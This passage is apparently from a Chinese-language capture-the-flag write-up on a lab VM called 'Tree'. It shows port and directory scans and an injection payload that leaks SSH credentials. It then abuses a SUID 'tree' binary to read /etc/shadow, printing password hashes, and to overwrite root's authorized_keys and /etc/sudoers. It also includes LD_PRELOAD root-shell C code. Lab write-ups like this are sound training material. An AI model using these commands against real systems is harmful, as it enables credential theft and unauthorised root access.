(ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:F1:AB:D3 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds</span><br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# nmap -sU --top-ports 100 192.168.2.56                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 21:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.56<br>Host is up (0.00047s latency).<br>All 100 scanned ports on 192.168.2.56 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 60 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:F1:AB:D3 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.94 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，发现是一个用户搜索系统<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507132135908.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.56/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.56/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,bak,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index.php            (Status: 200) [Size: 272]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>没有找到其他的目录</p><h2 id="2、Xpath注入"><a href="#2、Xpath注入" class="headerlink" title="2、Xpath注入"></a>2、Xpath注入</h2><p>尝试输入用户名，发现后面拼接着<code>?username=</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507132231078.png"></p><p>猜测可能存在SQL注入，直接万能语句<code>&#39; or &#39;1&#39;=&#39;1</code>，找到用户<code>yolo</code>以及密码<code>06f5086772e0</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507132232262.png"></p><h1 id="四、获取yolo权限"><a href="#四、获取yolo权限" class="headerlink" title="四、获取yolo权限"></a>四、获取yolo权限</h1><p>直接使用账号和密码进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# ssh yolo@192.168.2.56                                       <br>yolo@192.168.2.56<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Tree 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">yolo@Tree:~$ id </span><br><span class="hljs-string">uid=1000(yolo) gid=1000(yolo) groups=1000(yolo)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-df31759540dc28f75a20f443a19b1148&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>使用<code>sudo -l</code>，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> yolo: <br><span class="hljs-built_in">sudo</span>: a password is required<br></code></pre></td></tr></table></figure><p>在<code>home</code>目录下，找到另外一个用户<code>cnext</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root  root  4096 Jul 11 07:53 .<br>drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..<br>drwx------  2 cnext cnext 4096 Jul 11 07:54 cnext<br>drwxr-xr-x  2 yolo  yolo  4096 Jul 11 08:05 yolo<br></code></pre></td></tr></table></figure><p>查看具有<code>suid</code>的文件，找到<code>/usr/bin/tree</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/tree<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><h2 id="Tree提权"><a href="#Tree提权" class="headerlink" title="Tree提权"></a>Tree提权</h2><p>查看<code>/usr/bin/tree</code>的使用文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:~$ /usr/bin/tree --<span class="hljs-built_in">help</span><br>usage: tree [-acdfghilnpqrstuvxACDFJQNSUX] [-H baseHREF] [-T title ]<br>        [-L level [-R]] [-P pattern] [-I pattern] [-o filename] [--version]<br>        [--<span class="hljs-built_in">help</span>] [--inodes] [--device] [--noreport] [--nolinks] [--dirsfirst]<br>        [--charset charset] [--filelimit[=]#] [--si] [--timefmt[=]&lt;f&gt;]<br>        [--<span class="hljs-built_in">sort</span>[=]&lt;name&gt;] [--matchdirs] [--ignore-case] [--fromfile] [--]<br>        [&lt;directory list&gt;]<br>  ------- Listing options -------<br>  -a            All files are listed.<br>  -d            List directories only.<br>  -l            Follow symbolic links like directories.<br>  -f            Print the full path prefix <span class="hljs-keyword">for</span> each file.<br>  -x            Stay on current filesystem only.<br>  -L level      Descend only level directories deep.<br>  -R            Rerun tree when max <span class="hljs-built_in">dir</span> level reached.<br>  -P pattern    List only those files that match the pattern given.<br>  -I pattern    Do not list files that match the given pattern.<br>  --ignore-case Ignore <span class="hljs-keyword">case</span> when pattern matching.<br>  --matchdirs   Include directory names <span class="hljs-keyword">in</span> -P pattern matching.<br>  --noreport    Turn off file/directory count at end of tree listing.<br>  --charset X   Use charset X <span class="hljs-keyword">for</span> terminal/HTML and indentation line output.<br>  --filelimit <span class="hljs-comment"># Do not descend dirs with more than # files in them.</span><br>  --timefmt &lt;f&gt; Print and format <span class="hljs-keyword">time</span> according to the format &lt;f&gt;.<br>  -o filename   Output to file instead of stdout.<br>  ------- File options -------<br>  -q            Print non-printable characters as <span class="hljs-string">&#x27;?&#x27;</span>.<br>  -N            Print non-printable characters as is.<br>  -Q            Quote filenames with double quotes.<br>  -p            Print the protections <span class="hljs-keyword">for</span> each file.<br>  -u            Displays file owner or UID number.<br>  -g            Displays file group owner or GID number.<br>  -s            Print the size <span class="hljs-keyword">in</span> bytes of each file.<br>  -h            Print the size <span class="hljs-keyword">in</span> a more human readable way.<br>  --si          Like -h, but use <span class="hljs-keyword">in</span> SI units (powers of 1000).<br>  -D            Print the <span class="hljs-built_in">date</span> of last modification or (-c) status change.<br>  -F            Appends <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span> or <span class="hljs-string">&#x27;&gt;&#x27;</span> as per <span class="hljs-built_in">ls</span> -F.<br>  --inodes      Print inode number of each file.<br>  --device      Print device ID number to <span class="hljs-built_in">which</span> each file belongs.<br>  ------- Sorting options -------<br>  -v            Sort files alphanumerically by version.<br>  -t            Sort files by last modification <span class="hljs-keyword">time</span>.<br>  -c            Sort files by last status change <span class="hljs-keyword">time</span>.<br>  -U            Leave files unsorted.<br>  -r            Reverse the order of the <span class="hljs-built_in">sort</span>.<br>  --dirsfirst   List directories before files (-U disables).<br>  --<span class="hljs-built_in">sort</span> X      Select <span class="hljs-built_in">sort</span>: name,version,size,mtime,ctime.<br>  ------- Graphics options -------<br>  -i            Don<span class="hljs-string">&#x27;t print indentation lines.</span><br><span class="hljs-string">  -A            Print ANSI lines graphic indentation lines.</span><br><span class="hljs-string">  -S            Print with CP437 (console) graphics indentation lines.</span><br><span class="hljs-string">  -n            Turn colorization off always (-C overrides).</span><br><span class="hljs-string">  -C            Turn colorization on always.</span><br><span class="hljs-string">  ------- XML/HTML/JSON options -------</span><br><span class="hljs-string">  -X            Prints out an XML representation of the tree.</span><br><span class="hljs-string">  -J            Prints out an JSON representation of the tree.</span><br><span class="hljs-string">  -H baseHREF   Prints out HTML format with baseHREF as top directory.</span><br><span class="hljs-string">  -T string     Replace the default HTML title and H1 header with string.</span><br><span class="hljs-string">  --nolinks     Turn off hyperlinks in HTML output.</span><br><span class="hljs-string">  ------- Input options -------</span><br><span class="hljs-string">  --fromfile    Reads paths from files (.=stdin)</span><br><span class="hljs-string">  ------- Miscellaneous options -------</span><br><span class="hljs-string">  --version     Print version and exit.</span><br><span class="hljs-string">  --help        Print usage and this help message and exit.</span><br><span class="hljs-string">  --            Options processing terminator.</span><br></code></pre></td></tr></table></figure><h3 id="方法一：读取shadow"><a href="#方法一：读取shadow" class="headerlink" title="方法一：读取shadow"></a>方法一：读取shadow</h3><p><code>tree</code>命令的<code>--fromfile</code>可以进行读取文件，读取<code>/etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ /usr/bin/tree --fromfile -i /etc/shadow<br>ERROR: ld.so: object <span class="hljs-string">&#x27;/tmp/pe.so&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>/etc/shadow<br>_apt:*:20166:0:99999:7:::<br>backup:*:20166:0:99999:7:::<br>bin:*:20166:0:99999:7:::<br>cnext:$6<span class="hljs-variable">$ZjmfcSILA</span>.G5sfyX<span class="hljs-variable">$F40LCYH</span>.m1HpdKtDj2zZBxExp41bY1XE.WqmagM27SNF0X0ejkj4T5ys2PTPGaLdNNj2oGsJyJrh42J4J.gBq.:20280:0:99999:7:::<br>daemon:*:20166:0:99999:7:::<br>games:*:20166:0:99999:7:::<br>gnats:*:20166:0:99999:7:::<br>irc:*:20166:0:99999:7:::<br>list:*:20166:0:99999:7:::<br>lp:*:20166:0:99999:7:::<br>mail:*:20166:0:99999:7:::<br>man:*:20166:0:99999:7:::<br>messagebus:*:20166:0:99999:7:::<br>mysql:!:20280:0:99999:7:::<br>news:*:20166:0:99999:7:::<br>nobody:*:20166:0:99999:7:::<br>proxy:*:20166:0:99999:7:::<br>root:$6<span class="hljs-variable">$gj1</span>.TfiC99BG.F<br>4<span class="hljs-variable">$6OvXSQ</span><br>hKLq7uGZEyMaXQwmhNV9hSBlsL.Y<br>Tojwh5wBlJU<br>gPeLmwiUo<br>dkHwBrenDpo253k6Eqq0Mu0qXtz.:20280:0:99999:7:::<br>sshd:*:20166:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:20166:0:99999:7:::<br>sys:*:20166:0:99999:7:::<br>systemd-coredump:!!:20166::::::<br>systemd-network:*:20166:0:99999:7:::<br>systemd-resolve:*:20166:0:99999:7:::<br>systemd-timesync:*:20166:0:99999:7:::<br>uucp:*:20166:0:99999:7:::<br>www-data:*:20166:0:99999:7:::<br>yolo:$6<span class="hljs-variable">$Y6rR2ERG</span><br>lJ8f18x<span class="hljs-variable">$HWqyDphsZc0zWb</span>.9fVcoQpO9W9ytUKoud8bI30D7X<br>Nyo.89DLGVBbM2gDl3nuiE<br>jEMS0I7H1d.PifuJARrW<br>:20280:0:99999:7:::<br><br>9 directories, 28 files<br></code></pre></td></tr></table></figure><p>找到哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# <span class="hljs-built_in">cat</span> hash.txt | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;/&#x27;</span><br>root:$6<span class="hljs-variable">$gj1</span>.TfiC99BG.F/4<span class="hljs-variable">$6OvXSQ</span>/hKLq7uGZEyMaXQwmhNV9hSBlsL.Y/Tojwh5wBlJU/gPeLmwiUo/dkHwBrenDpo253k6Eqq0Mu0qXtz.:20280:0:99999:7:::/                                                                                   <br>┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# vi hash.txt<br><br>┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# <span class="hljs-built_in">cat</span> hash.txt              <br>root:$6<span class="hljs-variable">$gj1</span>.TfiC99BG.F/4<span class="hljs-variable">$6OvXSQ</span>/hKLq7uGZEyMaXQwmhNV9hSBlsL.Y/Tojwh5wBlJU/gPeLmwiUo/dkHwBrenDpo253k6Eqq0Mu0qXtz.:20280:0:99999:7:::/ <br></code></pre></td></tr></table></figure><p>使用john进行破解，即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure><h3 id="方法二：写私钥"><a href="#方法二：写私钥" class="headerlink" title="方法二：写私钥"></a>方法二：写私钥</h3><ul><li><p>生成私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ ssh-keygen -t ed25519<br>Generating public/private ed25519 key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/yolo/.ssh/id_ed25519):     <br>Created directory <span class="hljs-string">&#x27;/home/yolo/.ssh&#x27;</span>.<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/yolo/.ssh/id_ed25519<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/yolo/.ssh/id_ed25519.pub<br>The key fingerprint is:<br>SHA256:6YV81WtNfALzmF6TX2c1xwtA5LxIfgvpB5NrJKUOF1o yolo@Tree<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+--[ED25519 256]--+</span><br><span class="hljs-string">|          o++  oo|</span><br><span class="hljs-string">|          o  O o=|</span><br><span class="hljs-string">|       E o o+ O O|</span><br><span class="hljs-string">|      o.*o+o.. X+|</span><br><span class="hljs-string">|     o +SXoo. o o|</span><br><span class="hljs-string">|      +.+o* ..   |</span><br><span class="hljs-string">|       ..+ o     |</span><br><span class="hljs-string">|        . .      |</span><br><span class="hljs-string">|                 |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure></li><li><p>查看私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ <span class="hljs-built_in">cat</span> /home/yolo/.ssh/id_ed25519.pub <br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFqcIkl5fR2GPPr5t6rvJBm0U/5DaX5S36K0tw5B8fFz yolo@Tree<br></code></pre></td></tr></table></figure></li><li><p>将私钥写入到<code>/root</code>下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ /usr/bin/tree --fromfile -d <span class="hljs-string">&#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFqcIkl5fR2GPPr5t6rvJBm0U/5DaX5S36K0tw5B8fFz yolo@Tree&#x27;</span> -n --noreport -o /root/.ssh/authorized_keys<br>Error opening ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFqcIkl5fR2GPPr5t6rvJBm0U/5DaX5S36K0tw5B8fFz yolo@Tree <span class="hljs-keyword">for</span> reading.<br></code></pre></td></tr></table></figure></li><li><p>连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ ssh root@127.0.0.1<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Fri Jul 11 06:57:11 2025 from 192.168.3.94<br>root@Tree:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li></ul><h3 id="方法三：sudoers写入"><a href="#方法三：sudoers写入" class="headerlink" title="方法三：sudoers写入"></a>方法三：sudoers写入</h3><p>写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ vi sudoer<br>yolo@Tree:/tmp$ /usr/bin/tree --fromfile --noreport -i /tmp/sudoer<br>/tmp/sudoer<br>yolo ALL=(ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p>将文件写入到<code>/etc/sudoers</code></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">yolo@Tree:<span class="hljs-string">/tmp</span>$ <span class="hljs-string">/usr/bin/tree</span> <span class="hljs-params">--fromfile</span> <span class="hljs-params">--noreport</span> -i <span class="hljs-string">/tmp/sudoer</span> -o <span class="hljs-string">/etc/sudoers</span><br>yolo@Tree:<span class="hljs-string">/tmp</span>$ sudo -l<br><span class="hljs-string">/etc/sudoers</span><span class="hljs-function">:1</span><span class="hljs-function">:12</span>: syntax error<br><span class="hljs-string">/tmp/sudoer</span><br>User yolo may run the following commands on Tree:<br>    <span class="hljs-params">(ALL)</span> NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p>进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ <span class="hljs-built_in">sudo</span> /bin/bash -p<br>/etc/sudoers:1:12: syntax error<br>/tmp/sudoer<br>           ^<br>ERROR: ld.so: object <span class="hljs-string">&#x27;/tmp/pe.so&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>root@Tree:/tmp# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h3 id="方法三：LD-PRELOAD"><a href="#方法三：LD-PRELOAD" class="headerlink" title="方法三：LD_PRELOAD"></a>方法三：LD_PRELOAD</h3><p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取<code>LD_PRELOAD</code>环境变量和默认配置文件<code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载。即使程序不依赖这些动态链接库，<code>LD_PRELOAD</code>环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被加载，因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p><p>简单来说LD_PRELOAD的加载是最优先级的我们可以用他来做一些有趣的操作(骚操作).</p><p>一般情况下，<code>ld-linux.so</code>加载动态链接库的顺序为：<br><code>LD_PRELOAD &gt; LD_LIBRARY_PATH &gt; /etc/ld.so.cache &gt; /lib &gt; /usr/lib</code></p><p>编写提权文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">yolo@Tree:/tmp$ vi pe.c<br>yolo@Tree:/tmp$ <span class="hljs-built_in">cat</span> pe.c <br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include&lt;stdlib.h&gt;</span><br><br>void <span class="hljs-function"><span class="hljs-title">_init</span></span>()&#123;<br>        <span class="hljs-built_in">unlink</span>(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>        setgid(0);<br>        setuid(0);<br>        system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译文件</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs fortran">yolo@Tree:/tmp$ gcc -fPIC -<span class="hljs-keyword">shared</span> -o pe.so pe.c -nostartfiles<br>pe.c: <span class="hljs-keyword">In</span> <span class="hljs-function"><span class="hljs-keyword">function</span></span> ‘_init’:<br>pe.c:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>: warning: <span class="hljs-keyword">implicit</span> declaration of <span class="hljs-function"><span 